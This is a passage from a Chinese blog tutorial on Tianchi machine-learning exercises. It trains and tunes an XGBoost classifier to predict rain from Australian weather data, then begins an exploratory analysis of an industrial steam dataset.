是一种快速，强大，灵活且易于使用的开源数据分析和处理工具），matplotlib 和 seaborn 绘图。 12#导入需要用到的数据集!wget https://tianchi-media.oss-cn-beijing.aliyuncs.com/DSW/7XGBoost/train.csv 'wget' 不是内部或外部命令，也不是可运行的程序 或批处理文件。 Step1: 库函数导入 1234567## 基础函数库import numpy as np import pandas as pd## 绘图函数库import matplotlib.pyplot as pltimport seaborn as sns 本次我们选择天气数据集进行方法的尝试训练，现在有一些由气象站提供的每日降雨数据，我们需要根据历史降雨数据来预测明天会下雨的概率。样例涉及到的测试集数据 test.csv 与 train.csv 的格式完全相同，但其 RainTomorrow 未给出，为预测变量。 数据的各个特征描述如下： 特征名称 意义 取值范围 Date 日期 字符串 Location 气象站的地址 字符串 MinTemp 最低温度 实数 MaxTemp 最高温度 实数 Rainfall 降雨量 实数 Evaporation 蒸发量 实数 Sunshine 光照时间 实数 WindGustDir 最强的风的方向 字符串 WindGustSpeed 最强的风的速度 实数 WindDir9am 早上 9 点的风向 字符串 WindDir3pm 下午 3 点的风向 字符串 WindSpeed9am 早上 9 点的风速 实数 WindSpeed3pm 下午 3 点的风速 实数 Humidity9am 早上 9 点的湿度 实数 Humidity3pm 下午 3 点的湿度 实数 Pressure9am 早上 9 点的大气压 实数 Pressure3pm 早上 3 点的大气压 实数 Cloud9am 早上 9 点的云指数 实数 Cloud3pm 早上 3 点的云指数 实数 Temp9am 早上 9 点的温度 实数 Temp3pm 早上 3 点的温度 实数 RainToday 今天是否下雨 No，Yes RainTomorrow 明天是否下雨 No，Yes Step2: 数据读取 / 载入 123## 我们利用Pandas自带的read_csv函数读取并转化为DataFrame格式data = pd.read_csv(&#x27;train.csv&#x27;) Step3: 数据信息简单查看 12## 利用.info()查看数据的整体信息data.info() &lt;class 'pandas.core.frame.DataFrame'&gt; RangeIndex: 106644 entries, 0 to 106643 Data columns (total 23 columns): # Column Non-Null Count Dtype --- ------ -------------- ----- 0 Date 106644 non-null object 1 Location 106644 non-null object 2 MinTemp 106183 non-null float64 3 MaxTemp 106413 non-null float64 4 Rainfall 105610 non-null float64 5 Evaporation 60974 non-null float64 6 Sunshine 55718 non-null float64 7 WindGustDir 99660 non-null object 8 WindGustSpeed 99702 non-null float64 9 WindDir9am 99166 non-null object 10 WindDir3pm 103788 non-null object 11 WindSpeed9am 105643 non-null float64 12 WindSpeed3pm 104653 non-null float64 13 Humidity9am 105327 non-null float64 14 Humidity3pm 103932 non-null float64 15 Pressure9am 96107 non-null float64 16 Pressure3pm 96123 non-null float64 17 Cloud9am 66303 non-null float64 18 Cloud3pm 63691 non-null float64 19 Temp9am 105983 non-null float64 20 Temp3pm 104599 non-null float64 21 RainToday 105610 non-null object 22 RainTomorrow 106644 non-null object dtypes: float64(16), object(7) memory usage: 18.7+ MB 12## 进行简单的数据查看，我们可以利用 .head() 头部.tail()尾部data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; Date Location MinTemp MaxTemp Rainfall Evaporation Sunshine WindGustDir WindGustSpeed WindDir9am ... Humidity9am Humidity3pm Pressure9am Pressure3pm Cloud9am Cloud3pm Temp9am Temp3pm RainToday RainTomorrow 0 2012/1/19 MountGinini 12.1 23.1 0.0 NaN NaN W 30.0 N ... 60.0 54.0 NaN NaN NaN NaN 17.0 22.0 No No 1 2015/4/13 Nhil 10.2 24.7 0.0 NaN NaN E 39.0 E ... 63.0 33.0 1021.9 1017.9 NaN NaN 12.5 23.7 No Yes 2 2010/8/5 Nuriootpa -0.4 11.0 3.6 0.4 1.6 W 28.0 N ... 97.0 78.0 1025.9 1025.3 7.0 8.0 3.9 9.0 Yes No 3 2013/3/18 Adelaide 13.2 22.6 0.0 15.4 11.0 SE 44.0 E ... 47.0 34.0 1025.0 1022.2 NaN NaN 15.2 21.7 No No 4 2011/2/16 Sale 14.1 28.6 0.0 6.6 6.7 E 28.0 NE ... 92.0 42.0 1018.0 1014.1 4.0 7.0 19.1 28.2 No No 5 rows × 23 columns 这里我们发现数据集中存在 NaN，一般的我们认为 NaN 在数据集中代表了缺失值，可能是数据采集或处理时产生的一种错误。这里我们采用 - 1 将缺失值进行填补，还有其他例如 “中位数填补、平均数填补” 的缺失值处理方法有兴趣的同学也可以尝试。 1data = data.fillna(-1) 1data.tail() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; Date Location MinTemp MaxTemp Rainfall Evaporation Sunshine WindGustDir WindGustSpeed WindDir9am ... Humidity9am Humidity3pm Pressure9am Pressure3pm Cloud9am Cloud3pm Temp9am Temp3pm RainToday RainTomorrow 106639 2011/5/23 Launceston 10.1 16.1 15.8 -1.0 -1.0 SE 31.0 NNW ... 99.0 86.0 999.2 995.2 -1.0 -1.0 13.0 15.6 Yes Yes 106640 2014/12/9 GoldCoast 19.3 31.7 36.0 -1.0 -1.0 SE 80.0 NNW ... 75.0 76.0 1013.8 1010.0 -1.0 -1.0 26.0 25.8 Yes Yes 106641 2014/10/7 Wollongong 17.5 22.2 1.2 -1.0 -1.0 WNW 65.0 WNW ... 61.0 56.0 1008.2 1008.2 -1.0 -1.0 17.8 21.4 Yes No 106642 2012/1/16 Newcastle 17.6 27.0 3.0 -1.0 -1.0 -1 -1.0 NE ... 68.0 88.0 -1.0 -1.0 6.0 5.0 22.6 26.4 Yes No 106643 2014/10/21 AliceSprings 16.3 37.9 0.0 14.2 12.2 ESE 41.0 NNE ... 8.0 6.0 1017.9 1014.0 0.0 1.0 32.2 35.7 No No 5 rows × 23 columns Step4: 可视化描述 为了方便，我们先纪录数字特征与非数字特征： 1numerical_features = [x for x in data.columns if data[x].dtype == np.float] 1category_features = [x for x in data.columns if data[x].dtype != np.float and x != &#x27;RainTomorrow&#x27;] 1234## 选取三个特征与标签组合的散点可视化sns.pairplot(data=data[[&#x27;Rainfall&#x27;,&#x27;Evaporation&#x27;,&#x27;Sunshine&#x27;] + [&#x27;RainTomorrow&#x27;]], diag_kind=&#x27;hist&#x27;, hue= &#x27;RainTomorrow&#x27;)plt.show() ​ ​ 从上图可以发现，在 2D 情况下不同的特征组合对于第二天下雨与不下雨的散点分布，以及大概的区分能力。相对的 Sunshine 与其他特征的组合更具有区分能力 12345for col in data[numerical_features].columns: if col != &#x27;RainTomorrow&#x27;: sns.boxplot(x=&#x27;RainTomorrow&#x27;, y=col, saturation=0.5, palette=&#x27;pastel&#x27;, data=data) plt.title(col) plt.show() ​ ​ 利用箱型图我们也可以得到不同类别在不同特征上的分布差异情况。我们可以发现 Sunshine,Humidity3pm,Cloud9am,Cloud3pm 的区分能力较强 123456tlog = &#123;&#125;for i in category_features: tlog[i] = data[data[&#x27;RainTomorrow&#x27;] == &#x27;Yes&#x27;][i].value_counts()flog = &#123;&#125;for i in category_features: flog[i] = data[data[&#x27;RainTomorrow&#x27;] == &#x27;No&#x27;][i].value_counts() 12345678910plt.figure(figsize=(10,10))plt.subplot(1,2,1)plt.title(&#x27;RainTomorrow&#x27;)sns.barplot(x = pd.DataFrame(tlog[&#x27;Location&#x27;]).sort_index()[&#x27;Location&#x27;], y = pd.DataFrame(tlog[&#x27;Location&#x27;]).sort_index().index, color = &quot;red&quot;)plt.subplot(1,2,2)plt.title(&#x27;Not RainTomorrow&#x27;)sns.barplot(x = pd.DataFrame(flog[&#x27;Location&#x27;]).sort_index()[&#x27;Location&#x27;], y = pd.DataFrame(flog[&#x27;Location&#x27;]).sort_index().index, color = &quot;blue&quot;)plt.show() ​ ​ 从上图可以发现不同地区降雨情况差别很大，有些地方明显更容易降雨 12345678plt.figure(figsize=(10,2))plt.subplot(1,2,1)plt.title(&#x27;RainTomorrow&#x27;)sns.barplot(x = pd.DataFrame(tlog[&#x27;RainToday&#x27;][:2]).sort_index()[&#x27;RainToday&#x27;], y = pd.DataFrame(tlog[&#x27;RainToday&#x27;][:2]).sort_index().index, color = &quot;red&quot;)plt.subplot(1,2,2)plt.title(&#x27;Not RainTomorrow&#x27;)sns.barplot(x = pd.DataFrame(flog[&#x27;RainToday&#x27;][:2]).sort_index()[&#x27;RainToday&#x27;], y = pd.DataFrame(flog[&#x27;RainToday&#x27;][:2]).sort_index().index, color = &quot;blue&quot;)plt.show() ​ ​ 上图我们可以发现，今天下雨明天不一定下雨，但今天不下雨，第二天大概率也不下雨。 Step5: 对离散变量进行编码 由于 XGBoost 无法处理字符串类型的数据，我们需要一些方法讲字符串数据转化为数据。一种最简单的方法是把所有的相同类别的特征编码成同一个值，例如女 = 0，男 = 1，狗狗 = 2，所以最后编码的特征值是在 [0, 特征数量−1] 之间的整数。除此之外，还有独热编码、求和编码、留一法编码等等方法可以获得更好的效果。 123456789101112## 把所有的相同类别的特征编码为同一个值def get_mapfunction(x): mapp = dict(zip(x.unique().tolist(), range(len(x.unique().tolist())))) def mapfunction(y): if y in mapp: return mapp[y] else: return -1 return mapfunctionfor i in category_features: data[i] = data[i].apply(get_mapfunction(data[i])) 123## 编码后的字符串特征变成了数字data[&#x27;Location&#x27;].unique() array([ 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48], dtype=int64) Step6: 利用 XGBoost 进行训练与预测 12345678910111213## 为了正确评估模型性能，将数据划分为训练集和测试集，## 并在训练集上训练模型，在测试集上验证模型性能。from sklearn.model_selection import train_test_split## 选择其类别为0和1的样本 （不包括类别为2的样本）data_target_part = data[&#x27;RainTomorrow&#x27;]data_features_part = data[[x for x in data.columns if x != &#x27;RainTomorrow&#x27;]]## 测试集大小为20%， 80%/20%分x_train, x_test, y_train, y_test = train_test_split(data_features_part, data_target_part, test_size = 0.2, random_state = 2020) 123456## 导入XGBoost模型from xgboost.sklearn import XGBClassifier## 定义 XGBoost模型 clf = XGBClassifier()# 在训练集上训练XGBoost模型clf.fit(x_train, y_train) c:\\users\\administrator\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\xgboost\\sklearn.py:1146: UserWarning: The use of label encoder in XGBClassifier is deprecated and will be removed in a future release. To remove this warning, do the following: 1) Pass option use_label_encoder=False when constructing XGBClassifier object; and 2) Encode your labels (y) as integers starting with 0, i.e. 0, 1, 2, ..., [num_class - 1]. warnings.warn(label_encoder_deprecation_msg, UserWarning) [15:22:25] WARNING: C:/Users/Administrator/workspace/xgboost-win64_release_1.4.0/src/learner.cc:1095: Starting in XGBoost 1.3.0, the default evaluation metric used with the objective 'binary:logistic' was changed from 'error' to 'logloss'. Explicitly set eval_metric if you'd like to restore the old behavior. XGBClassifier(base_score=0.5, booster='gbtree', colsample_bylevel=1, colsample_bynode=1, colsample_bytree=1, gamma=0, gpu_id=-1, importance_type='gain', interaction_constraints='', learning_rate=0.300000012, max_delta_step=0, max_depth=6, min_child_weight=1, missing=nan, monotone_constraints='()', n_estimators=100, n_jobs=32, num_parallel_tree=1, random_state=0, reg_alpha=0, reg_lambda=1, scale_pos_weight=1, subsample=1, tree_method='exact', validate_parameters=1, verbosity=None) 12345678910111213141516171819## 在训练集和测试集上分布利用训练好的模型进行预测train_predict = clf.predict(x_train)test_predict = clf.predict(x_test)from sklearn import metrics## 利用accuracy（准确度）【预测正确的样本数目占总预测样本数目的比例】评估模型效果print(&#x27;The accuracy of the Logistic Regression is:&#x27;,metrics.accuracy_score(y_train,train_predict))print(&#x27;The accuracy of the Logistic Regression is:&#x27;,metrics.accuracy_score(y_test,test_predict))## 查看混淆矩阵 (预测值和真实值的各类情况统计矩阵)confusion_matrix_result = metrics.confusion_matrix(test_predict,y_test)print(&#x27;The confusion matrix result:\\n&#x27;,confusion_matrix_result)# 利用热力图对于结果进行可视化plt.figure(figsize=(8, 6))sns.heatmap(confusion_matrix_result, annot=True, cmap=&#x27;Blues&#x27;)plt.xlabel(&#x27;Predicted labels&#x27;)plt.ylabel(&#x27;True labels&#x27;)plt.show() The accuracy of the Logistic Regression is: 0.8982476703979371 The accuracy of the Logistic Regression is: 0.8575179333302076 The confusion matrix result: [[15656 2142] [ 897 2634]] 我们可以发现共有 15759 + 2306 个样本预测正确，2470 + 794 个样本预测错误。 Step7: 利用 XGBoost 进行特征选择 XGBoost 的特征选择属于特征选择中的嵌入式方法，在 XGboost 中可以用属性 feature_importances_去查看特征的重要度。 1? sns.barplot 1sns.barplot(y=data_features_part.columns, x=clf.feature_importances_) &lt;AxesSubplot:&gt; ​ ​ 从图中我们可以发现下午 3 点的湿度与今天是否下雨是决定第二天是否下雨最重要的因素 初次之外，我们还可以使用 XGBoost 中的下列重要属性来评估特征的重要性。 weight: 是以特征用到的次数来评价 gain: 当利用特征做划分的时候的评价基尼指数 cover: 利用一个覆盖样本的指标二阶导数（具体原理不清楚有待探究）平均值来划分。 total_gain: 总基尼指数 total_cover: 总覆盖 123456789101112131415161718192021222324from sklearn.metrics import accuracy_scorefrom xgboost import plot_importancedef estimate(model,data): #sns.barplot(data.columns,model.feature_importances_) ax1=plot_importance(model,importance_type=&quot;gain&quot;) ax1.set_title(&#x27;gain&#x27;) ax2=plot_importance(model, importance_type=&quot;weight&quot;) ax2.set_title(&#x27;weight&#x27;) ax3 = plot_importance(model, importance_type=&quot;cover&quot;) ax3.set_title(&#x27;cover&#x27;) plt.show()def classes(data,label,test): model=XGBClassifier() model.fit(data,label) ans=model.predict(test) estimate(model, data) return ans ans=classes(x_train,y_train,x_test)pre=accuracy_score(y_test, ans)print(&#x27;acc=&#x27;,accuracy_score(y_test,ans)) c:\\users\\administrator\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\xgboost\\sklearn.py:1146: UserWarning: The use of label encoder in XGBClassifier is deprecated and will be removed in a future release. To remove this warning, do the following: 1) Pass option use_label_encoder=False when constructing XGBClassifier object; and 2) Encode your labels (y) as integers starting with 0, i.e. 0, 1, 2, ..., [num_class - 1]. warnings.warn(label_encoder_deprecation_msg, UserWarning) [15:25:51] WARNING: C:/Users/Administrator/workspace/xgboost-win64_release_1.4.0/src/learner.cc:1095: Starting in XGBoost 1.3.0, the default evaluation metric used with the objective 'binary:logistic' was changed from 'error' to 'logloss'. Explicitly set eval_metric if you'd like to restore the old behavior. acc= 0.8575179333302076 这些图同样可以帮助我们更好的了解其他重要特征。 Step8: 通过调整参数获得更好的效果 XGBoost 中包括但不限于下列对模型影响较大的参数： learning_rate: 有时也叫作 eta，系统默认值为 0.3。每一步迭代的步长，很重要。太大了运行准确率不高，太小了运行速度慢。 subsample：系统默认为 1。这个参数控制对于每棵树，随机采样的比例。减小这个参数的值，算法会更加保守，避免过拟合，取值范围零到一。 colsample_bytree：系统默认值为 1。我们一般设置成 0.8 左右。用来控制每棵随机采样的列数的占比 (每一列是一个特征)。 max_depth： 系统默认值为 6，我们常用 3-10 之间的数字。这个值为树的最大深度。这个值是用来控制过拟合的。max_depth 越大，模型学习的更加具体。 调节模型参数的方法有贪心算法、网格调参、贝叶斯调参等。这里我们采用网格调参，它的基本思想是穷举搜索：在所有候选的参数选择中，通过循环遍历，尝试每一种可能性，表现最好的参数就是最终的结果 123456789101112131415161718## 从sklearn库中导入网格调参函数from sklearn.model_selection import GridSearchCV## 定义参数取值范围learning_rate = [0.1, 0.3, 0.6]subsample = [0.8, 0.9]colsample_bytree = [0.6, 0.8]max_depth = [3,5,8]parameters = &#123; &#x27;learning_rate&#x27;: learning_rate, &#x27;subsample&#x27;: subsample, &#x27;colsample_bytree&#x27;:colsample_bytree, &#x27;max_depth&#x27;: max_depth&#125;model = XGBClassifier(n_estimators = 50)## 进行网格搜索clf = GridSearchCV(model, parameters, cv=3, scoring=&#x27;accuracy&#x27;,verbose=1,n_jobs=-1)clf = clf.fit(x_train, y_train) Fitting 3 folds for each of 36 candidates, totalling 108 fits c:\\users\\administrator\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\xgboost\\sklearn.py:1146: UserWarning: The use of label encoder in XGBClassifier is deprecated and will be removed in a future release. To remove this warning, do the following: 1) Pass option use_label_encoder=False when constructing XGBClassifier object; and 2) Encode your labels (y) as integers starting with 0, i.e. 0, 1, 2, ..., [num_class - 1]. warnings.warn(label_encoder_deprecation_msg, UserWarning) [15:28:20] WARNING: C:/Users/Administrator/workspace/xgboost-win64_release_1.4.0/src/learner.cc:1095: Starting in XGBoost 1.3.0, the default evaluation metric used with the objective 'binary:logistic' was changed from 'error' to 'logloss'. Explicitly set eval_metric if you'd like to restore the old behavior. 123## 网格搜索后的最好参数为clf.best_params_ &#123;'colsample_bytree': 0.6, 'learning_rate': 0.1, 'max_depth': 8, 'subsample': 0.8&#125; 123456789101112131415161718192021222324## 在训练集和测试集上分布利用最好的模型参数进行预测## 定义带参数的 XGBoost模型 clf = XGBClassifier(colsample_bytree = 0.6, learning_rate = 0.3, max_depth= 8, subsample = 0.9)# 在训练集上训练XGBoost模型clf.fit(x_train, y_train)train_predict = clf.predict(x_train)test_predict = clf.predict(x_test)## 利用accuracy（准确度）【预测正确的样本数目占总预测样本数目的比例】评估模型效果print(&#x27;The accuracy of the Logistic Regression is:&#x27;,metrics.accuracy_score(y_train,train_predict))print(&#x27;The accuracy of the Logistic Regression is:&#x27;,metrics.accuracy_score(y_test,test_predict))## 查看混淆矩阵 (预测值和真实值的各类情况统计矩阵)confusion_matrix_result = metrics.confusion_matrix(test_predict,y_test)print(&#x27;The confusion matrix result:\\n&#x27;,confusion_matrix_result)# 利用热力图对于结果进行可视化plt.figure(figsize=(8, 6))sns.heatmap(confusion_matrix_result, annot=True, cmap=&#x27;Blues&#x27;)plt.xlabel(&#x27;Predicted labels&#x27;)plt.ylabel(&#x27;True labels&#x27;)plt.show() [15:28:36] WARNING: C:/Users/Administrator/workspace/xgboost-win64_release_1.4.0/src/learner.cc:1095: Starting in XGBoost 1.3.0, the default evaluation metric used with the objective 'binary:logistic' was changed from 'error' to 'logloss'. Explicitly set eval_metric if you'd like to restore the old behavior. The accuracy of the Logistic Regression is: 0.9434917658090606 The accuracy of the Logistic Regression is: 0.8577992404707206 The confusion matrix result: [[15639 2119] [ 914 2657]] 原本有 2470 + 790 个错误，现在有 2112 + 939 个错误，带来了明显的正确率提升。 # 2.4 重要知识点 # 2.4.1 XGBoost 的重要参数 1.eta [默认 0.3] 通过为每一颗树增加权重，提高模型的鲁棒性。 典型值为 0.01-0.2。 2.min_child_weight [默认 1] 决定最小叶子节点样本权重和。 这个参数可以避免过拟合。当它的值较大时，可以避免模型学习到局部的特殊样本。 但是如果这个值过高，则会导致模型拟合不充分。 3.max_depth [默认 6] 这个值也是用来避免过拟合的。max_depth 越大，模型会学到更具体更局部的样本。 典型值：3-10 4.max_leaf_nodes 树上最大的节点或叶子的数量。 可以替代 max_depth 的作用。 这个参数的定义会导致忽略 max_depth 参数。 5.gamma [默认 0] 在节点分裂时，只有分裂后损失函数的值下降了，才会分裂这个节点。Gamma 指定了节点分裂所需的最小损失函数下降值。 这个参数的值越大，算法越保守。这个参数的值和损失函数息息相关。 6.max_delta_step [默认 0] 这参数限制每棵树权重改变的最大步长。如果这个参数的值为 0，那就意味着没有约束。如果它被赋予了某个正值，那么它会让这个算法更加保守。 但是当各类别的样本十分不平衡时，它对分类问题是很有帮助的。 7.subsample [默认 1] 这个参数控制对于每棵树，随机采样的比例。 减小这个参数的值，算法会更加保守，避免过拟合。但是，如果这个值设置得过小，它可能会导致欠拟合。 典型值：0.5-1 8.colsample_bytree [默认 1] 用来控制每棵随机采样的列数的占比 (每一列是一个特征)。 典型值：0.5-1 9.colsample_bylevel [默认 1] 用来控制树的每一级的每一次分裂，对列数的采样的占比。 subsample 参数和 colsample_bytree 参数可以起到相同的作用，一般用不到。 10.lambda [默认 1] 权重的 L2 正则化项。(和 Ridge regression 类似)。 这个参数是用来控制 XGBoost 的正则化部分的。虽然大部分数据科学家很少用到这个参数，但是这个参数在减少过拟合上还是可以挖掘出更多用处的。 11.alpha [默认 1] 权重的 L1 正则化项。(和 Lasso regression 类似)。 可以应用在很高维度的情况下，使得算法的速度更快。 12.scale_pos_weight [默认 1] 在各类别样本十分不平衡时，把这个参数设定为一个正值，可以使算法更快收敛。 # 2.4.2 XGBoost 原理粗略讲解 XGBoost 底层实现了 GBDT 算法，并对 GBDT 算法做了一系列优化： 对目标函数进行了泰勒展示的二阶展开，可以更加高效拟合误差。 提出了一种估计分裂点的算法加速 CART 树的构建过程，同时可以处理稀疏数据。 提出了一种树的并行策略加速迭代。 为模型的分布式算法进行了底层优化。 XGBoost 是基于 CART 树的集成模型，它的思想是串联多个决策树模型共同进行决策。 那么如何串联呢？XGBoost 采用迭代预测误差的方法串联。举个通俗的例子，我们现在需要预测一辆车价值 3000 元。我们构建决策树 1 训练后预测为 2600 元，我们发现有 400 元的误差，那么决策树 2 的训练目标为 400 元，但决策树 2 的预测结果为 350 元，还存在 50 元的误差就交给第三棵树…… 以此类推，每一颗树用来估计之前所有树的误差，最后所有树预测结果的求和就是最终预测结果！ XGBoost 的基模型是 CART 回归树，它有两个特点：（1）CART 树，是一颗二叉树。（2）回归树，最后拟合结果是连续值。 XGBoost 模型可以表示为以下形式，我们约定ft(x)f_t(x)ft​(x) 表示前ttt 颗树的和，ht(x)h_t(x)ht​(x) 表示第 ttt 颗决策树，模型定义如下： ft(x)=∑t=1Tht(x)f_t(x) = \\sum_{t=1}^{T}h_t(x) ft​(x)=t=1∑T​ht​(x) 由于模型递归生成，第ttt 步的模型由第t−1t−1t−1 步的模型形成，可以写成： ft(x)=ft−1(x)+ht(x)f_t(x) = f_{t-1}(x) + h_t(x) ft​(x)=ft−1​(x)+ht​(x) 每次需要加上的树ht(x)h_t(x)ht​(x) 是之前树求和的误差： rt,i=yi−fm−1(xi)r_{t,i} = y_i - f_{m-1}(x_i) rt,i​=yi​−fm−1​(xi​) 我们每一步只要拟合一颗输出为rt,ir_{t,i}rt,i​ 的 CART 树加到ft−1(x)f_{t-1}(x)ft−1​(x) 就可以了。","categories":[{"name":"天池机器学习入门","slug":"天池机器学习入门","permalink":"http://example.com/categories/%E5%A4%A9%E6%B1%A0%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}]},{"title":"工业蒸汽数据分析","slug":"机器学习/天池/工业蒸汽数据分析","date":"2021-11-08T07:02:54.000Z","updated":"2021-12-08T08:26:06.353Z","comments":true,"path":"2021/11/08/机器学习/天池/工业蒸汽数据分析/","link":"","permalink":"http://example.com/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%A4%A9%E6%B1%A0/%E5%B7%A5%E4%B8%9A%E8%92%B8%E6%B1%BD%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/","excerpt":"","text":"# 导入数据探索的工具包 1234567891011import numpy as npimport pandas as pdimport matplotlib.pyplot as pltimport seaborn as snsfrom scipy import statsimport warningswarnings.filterwarnings(&quot;ignore&quot;) %matplotlib inline # 读取数据文件 使用 Pandas 库 read_csv () 函数进行数据读取，分割符为‘\\t’ 123# 下载需要用到的数据集!wget http://tianchi-media.oss-cn-beijing.aliyuncs.com/DSW/Industrial_Steam_Forecast/zhengqi_test.txt!wget http://tianchi-media.oss-cn-beijing.aliyuncs.com/DSW/Industrial_Steam_Forecast/zhengqi_train.txt 12345train_data_file = &quot;./zhengqi_train.txt&quot;test_data_file = &quot;./zhengqi_test.txt&quot;train_data = pd.read_csv(train_data_file, sep=&#x27;\\t&#x27;, encoding=&#x27;utf-8&#x27;)test_data = pd.read_csv(test_data_file, sep=&#x27;\\t&#x27;, encoding=&#x27;utf-8&#x27;) # 查看训练集特征变量信息 1train_data.info() &lt;class 'pandas.core.frame.DataFrame'&gt; RangeIndex: 2888 entries, 0 to 2887 Data columns (total 39 columns): # Column Non-Null Count Dtype --- ------ -------------- ----- 0 V0 2888 non-null float64 1 V1 2888 non-null float64 2 V2 2888 non-null float64 3 V3 2888 non-null float64 4 V4 2888 non-null float64 5 V5 2888 non-null float64 6 V6 2888 non-null float64 7 V7 2888 non-null float64 8 V8 2888 non-null float64 9 V9 2888 non-null float64 10 V10 2888 non-null float64 11 V11 2888 non-null float64 12 V12 2888 non-null float64 13 V13 2888 non-null float64 14 V14 2888 non-null float64 15 V15 2888 non-null float64 16 V16 2888 non-null float64 17 V17 2888 non-null float64 18 V18 2888 non-null float64 19 V19 2888 non-null float64 20 V20 2888 non-null float64 21 V21 2888 non-null float64 22 V22 2888 non-null float64 23 V23 2888 non-null float64 24 V24 2888 non-null float64 25 V25 2888 non-null float64 26 V26 2888 non-null float64 27 V27 2888 non-null float64 28 V28 2888 non-null float64 29 V29 2888 non-null float64 30 V30 2888 non-null float64 31 V31 2888 non-null float64 32 V32 2888 non-null float64 33 V33 2888 non-null float64 34 V34 2888 non-null float64 35 V35 2888 non-null float64 36 V36 2888 non-null float64 37 V37 2888 non-null float64 38 target 2888 non-null float64 dtypes: float64(39) memory usage: 880.1 KB 此训练集数据共有 2888 个样本，数据中有 V0-V37 共计 38 个特征变量，变量类型都为数值类型，所有数据特征没有缺失值数据； 数据字段由于采用了脱敏处理，删除了特征数据的具体含义；target 字段为标签变量 12test_data.info() &lt;class 'pandas.core.frame.DataFrame'&gt; RangeIndex: 1925 entries, 0 to 1924 Data columns (total 38 columns): # Column Non-Null Count Dtype --- ------ -------------- ----- 0 V0 1925 non-null float64 1 V1 1925 non-null float64 2 V2 1925 non-null float64 3 V3 1925 non-null float64 4 V4 1925 non-null float64 5 V5 1925 non-null float64 6 V6 1925 non-null float64 7 V7 1925 non-null float64 8 V8 1925 non-null float64 9 V9 1925 non-null float64 10 V10 1925 non-null float64 11 V11 1925 non-null float64 12 V12 1925 non-null float64 13 V13 1925 non-null float64 14 V14 1925 non-null float64 15 V15 1925 non-null float64 16 V16 1925 non-null float64 17 V17 1925 non-null float64 18 V18 1925 non-null float64 19 V19 1925 non-null float64 20 V20 1925 non-null float64 21 V21 1925 non-null float64 22 V22 1925 non-null float64 23 V23 1925 non-null float64 24 V24 1925 non-null float64 25 V25 1925 non-null float64 26 V26 1925 non-null float64 27 V27 1925 non-null float64 28 V28 1925 non-null float64 29 V29 1925 non-null float64 30 V30 1925 non-null float64 31 V31 1925 non-null float64 32 V32 1925 non-null float64 33 V33 1925 non-null float64 34 V34 1925 non-null float64 35 V35 1925 non-null float64 36 V36 1925 non-null float64 37 V37 1925 non-null float64 dtypes: float64(38) memory usage: 571.6 KB 测试集数据共有 1925 个样本，数据中有 V0-V37 共计 38 个特征变量，变量类型都为数值类型 # 查看数据统计信息 1train_data.describe() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; V0 V1 V2 V3 V4 V5 V6 V7 V8 V9 ... V29 V30 V31 V32 V33 V34 V35 V36 V37 target count 2888.000000 2888.000000 2888.000000 2888.000000 2888.000000 2888.000000 2888.000000 2888.000000 2888.000000 2888.000000 ... 2888.000000 2888.000000 2888.000000 2888.000000 2888.000000 2888.000000 2888.000000 2888.000000 2888.000000 2888.000000 mean 0.123048 0.056068 0.289720 -0.067790 0.012921 -0.558565 0.182892 0.116155 0.177856 -0.169452 ... 0.097648 0.055477 0.127791 0.020806 0.007801 0.006715 0.197764 0.030658 -0.130330 0.126353 std 0.928031 0.941515 0.911236 0.970298 0.888377 0.517957 0.918054 0.955116 0.895444 0.953813 ... 1.061200 0.901934 0.873028 0.902584 1.006995 1.003291 0.985675 0.970812 1.017196 0.983966 min -4.335000 -5.122000 -3.420000 -3.956000 -4.742000 -2.182000 -4.576000 -5.048000 -4.692000 -12.891000 ... -2.912000 -4.507000 -5.859000 -4.053000 -4.627000 -4.789000 -5.695000 -2.608000 -3.630000 -3.044000 25% -0.297000 -0.226250 -0.313000 -0.652250 -0.385000 -0.853000 -0.310000 -0.295000 -0.159000 -0.390000 ... -0.664000 -0.283000 -0.170250 -0.407250 -0.499000 -0.290000 -0.202500 -0.413000 -0.798250 -0.350250 50% 0.359000 0.272500 0.386000 -0.044500 0.110000 -0.466000 0.388000 0.344000 0.362000 0.042000 ... -0.023000 0.053500 0.299500 0.039000 -0.040000 0.160000 0.364000 0.137000 -0.185500 0.313000 75% 0.726000 0.599000 0.918250 0.624000 0.550250 -0.154000 0.831250 0.782250 0.726000 0.042000 ... 0.745250 0.488000 0.635000 0.557000 0.462000 0.273000 0.602000 0.644250 0.495250 0.793250 max 2.121000 1.918000 2.828000 2.457000 2.689000 0.489000 1.895000 1.918000 2.245000 1.335000 ... 4.580000 2.689000 2.013000 2.395000 5.465000 5.110000 2.324000 5.238000 3.000000 2.538000 8 rows × 39 columns 1test_data.describe() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; V0 V1 V2 V3 V4 V5 V6 V7 V8 V9 ... V28 V29 V30 V31 V32 V33 V34 V35 V36 V37 count 1925.000000 1925.000000 1925.000000 1925.000000 1925.000000 1925.000000 1925.000000 1925.000000 1925.000000 1925.000000 ... 1925.000000 1925.000000 1925.000000 1925.000000 1925.000000 1925.000000 1925.000000 1925.000000 1925.000000 1925.000000 mean -0.184404 -0.083912 -0.434762 0.101671 -0.019172 0.838049 -0.274092 -0.173971 -0.266709 0.255114 ... -0.206871 -0.146463 -0.083215 -0.191729 -0.030782 -0.011433 -0.009985 